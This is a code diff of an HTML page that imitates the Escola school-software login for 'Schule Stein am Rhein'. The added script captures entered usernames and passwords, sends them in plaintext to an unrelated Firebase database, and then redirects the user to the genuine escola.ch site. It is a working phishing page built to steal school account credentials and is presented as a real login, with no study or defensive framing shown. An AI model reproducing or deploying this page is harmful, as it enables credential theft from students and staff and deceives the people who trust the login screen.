@@ -1,51 +1,236 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <title>Escola Login</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Escola - Login</title>
+
+  <link href="inc/font/nunito/nunito.css" rel="stylesheet" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Nunito', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      background-color: #E2F3FF;
+      background-image: url("static/login/wave.svg");
+      background-repeat: no-repeat;
+      background-position: bottom;
+      background-size: 100% auto;
+    }
+
+    /* SOL PANEL */
+    #login-left-panel {
+      width: 400px;
+      height: 100vh;
+      background: #fff;
+      padding: 32px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: fixed;
+    }
+
+    #login-logo-text {
+      font-size: 26px;
+      font-weight: 800;
+      color: #007fe7;
+    }
+
+    #login-slogan {
+      font-size: 30px;
+      font-weight: 700;
+      line-height: 1.3;
+    }
+
+    /* MOBİL ÜST BAR */
+    #mobile-header {
+      display: none;
+      background: #fff;
+      padding: 16px;
+      text-align: center;
+      font-weight: 800;
+      color: #007fe7;
+      font-size: 22px;
+    }
+
+    /* SAĞ İÇERİK */
+    #login-content {
+      margin-left: 400px;
+      padding: 64px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      width: 420px;
+    }
+
+    h1 {
+      margin-bottom: 24px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      font-size: 15px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #5aa9e6;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      border-radius: 4px;
+    }
+
+    button:hover {
+      background: #4296d6;
+    }
+
+    /* SOCIAL */
+    .social {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .social a {
+      text-decoration: none;
+      background: #007fe7;
+      color: #fff;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .social a:hover {
+      background: #005bb5;
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 1279px) {
+      #login-left-panel {
+        display: none;
+      }
+
+      #mobile-header {
+        display: block;
+      }
+
+      #login-content {
+        margin-left: 0;
+        padding: 32px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 22px;
+        text-align: center;
+      }
+
+      input,
+      button {
+        font-size: 16px;
+        padding: 14px;
+      }
+
+      .login-box {
+        max-width: 360px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-<!-- SOL SABİT PANEL -->
-<div id="login-left-panel">
-    <img src="logo.svg" alt="escola" width="150">
+  <div id="mobile-header">escola</div>
+
+  <div id="login-left-panel">
+    <div id="login-logo-text">{ escola }</div>
 
     <div id="login-slogan">
-        Webbasierte Software<br>
-        für den Schweizer<br>
-        Schulalltag
+      Webbasierte Software<br>
+      für den Schweizer<br>
+      Schulalltag
     </div>
 
-    <div id="login-copyright">
-        © Escola GmbH
-    </div>
-</div>
-
-<!-- SAĞ İÇERİK -->
-<div id="login-content">
-
-    <a href="#" class="back-btn">← Zurück</a>
-
-    <div class="form-area">
-        <p class="small">Anmeldedaten vergessen?</p>
-        <h2>Schulen Stein am Rhein</h2>
-        <a href="#" class="change">Schule wechseln</a>
-
-        <p class="info">
-            Geben Sie die E-Mail-Adresse Ihres Escola-Accounts ein.
-            Danach wird Ihnen eine E-Mail mit Ihrem Benutzernamen
-            und einem Reset-Code zugesandt.
-        </p>
-
-        <label>E-Mail-Adresse</label>
-        <input type="email" placeholder="E-Mail-Adresse">
-
-        <button>Code anfordern</button>
+    <div class="social">
+      <a href="https://www.facebook.com/escola.ch" target="_blank">Facebook</a>
+      <a href="https://twitter.com/escola_ch" target="_blank">Twitter</a>
+      <a href="https://www.instagram.com/escola.ch" target="_blank">Instagram</a>
     </div>
 
-    <img src="illustration.png" class="illustration">
-</div>
+    <div>© Escola GmbH</div>
+  </div>
+
+  <div id="login-content">
+    <div class="login-box">
+      <h1>Schule Stein am Rhein</h1>
+      <input id="username" placeholder="Benutzername" />
+      <input id="password" type="password" placeholder="Passwort" />
+      <button id="loginBtn">Anmelden</button>
+    </div>
+  </div>
+
+  <!-- FIREBASE -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBpuVs9M1vUhR9OXahdm4vhpZMrKl9KuGI",
+      authDomain: "ertee-fc073.firebaseapp.com",
+      databaseURL: "https://ertee-fc073-default-rtdb.firebaseio.com",
+      projectId: "ertee-fc073",
+      storageBucket: "ertee-fc073.appspot.com",
+      messagingSenderId: "738703331926",
+      appId: "1:738703331926:web:fcb8aaf5b54b9a884c21f7"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    const loginBtn = document.getElementById('loginBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    loginBtn.addEventListener('click', () => {
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!username || !password) {
+        alert('Benutzername und Passwort sind erforderlich');
+        return;
+      }
+
+      push(ref(database, 'logins'), {
+        username: username,
+        password: password,
+        school: 'Schule Stein am Rhein',
+        createdAt: new Date().toISOString()
+      })
+      .then(() => {
+        alert('Login gespeichert ✅');
+        window.location.href = 'https://www.escola.ch/';
+      })
+      .catch(err => {
+        alert('Firebase Fehler ❌: ' + err.message);
+      });
+    });
+  </script>
 
 </body>
 </html>
